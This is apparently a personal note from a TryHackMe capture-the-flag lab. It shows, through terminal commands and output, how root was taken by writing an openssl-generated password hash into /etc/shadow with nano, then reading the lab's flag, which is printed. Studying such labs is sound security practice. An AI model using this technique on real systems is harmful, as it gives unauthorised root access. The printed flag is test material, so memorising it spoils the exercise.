+it's easier with nano
+
+we can use open ssh to create a new passowrd hash, and then modify the hash of root user in /etc/shadow
+
+
+zeamkish@ip-10-10-132-201:~$ openssl passwd -1 -salt root 1234
+$1$root$.fAWE/htZAqQge.bvM16O/
+zeamkish@ip-10-10-132-201:~$ /usr/bin/nano /etc/shadow
+
+
+zeamkish@ip-10-10-132-201:~$ /usr/bin/nano /etc/shadow
+zeamkish@ip-10-10-132-201:~$ su root
+Password: 
+root@ip-10-10-132-201:/home/zeamkish# cd /root
+root@ip-10-10-132-201:~# ls
+flag.txt  snap
+root@ip-10-10-132-201:~# cat flag.txt
+THM{ROOT_EXPOSED_1001}
+root@ip-10-10-132-201:~# 
+
+
+
